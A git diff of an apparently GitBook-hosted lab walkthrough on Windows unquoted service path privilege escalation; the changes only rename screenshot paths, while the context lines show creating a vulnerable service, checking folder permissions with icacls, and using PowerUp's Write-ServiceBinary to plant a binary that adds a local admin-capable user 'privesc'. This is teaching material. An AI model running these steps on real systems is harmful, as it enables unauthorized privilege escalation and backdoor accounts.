@@ -27,7 +27,7 @@ sc.exe create "Service" binpath= "C:\Program Files\bin folder\program\bin x64\Se
 mkdir "C:\Program Files\bin folder\program\bin x64"
 ```
 
-![](<../../../.gitbook/assets/image (10) (1) (2) (1).png>)
+![](<../../../.gitbook/assets/image (10) (1) (2) (1) (1).png>)
 
 4\. Run icacls to check the current permissions on the directories with a space in it:
 
@@ -121,7 +121,7 @@ icacls.exe "C:\Program Files\bin folder\program"
 
 We have no write permissions in `C:\Program Files`:
 
-![](<../../../.gitbook/assets/image (52) (1) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (52) (1) (1) (1) (1) (1) (1).png>)
 
 But we do have write permissions in `C:\Program Files\bin folder\program`.
 
@@ -133,13 +133,13 @@ But we do have write permissions in `C:\Program Files\bin folder\program`.
 Write-ServiceBinary -ServiceName 'Service' -ServicePath 'C:\Program Files\bin folder\program\bin.exe' -Username 'privesc' -Password "Welcome2022!" 
 ```
 
-![](<../../../.gitbook/assets/image (22) (1) (1).png>)
+![](<../../../.gitbook/assets/image (22) (1) (1) (1).png>)
 
 8\. Our current user can't start the service, which means we should restart the machine and check if the user `privesc` is created.
 
 ![](<../../../.gitbook/assets/image (13) (1) (1) (1) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1).png>)
 
 9\. Start a new PowerShell session as Administrator and fill in the credentials `privesc:Welcome2022!`.
 
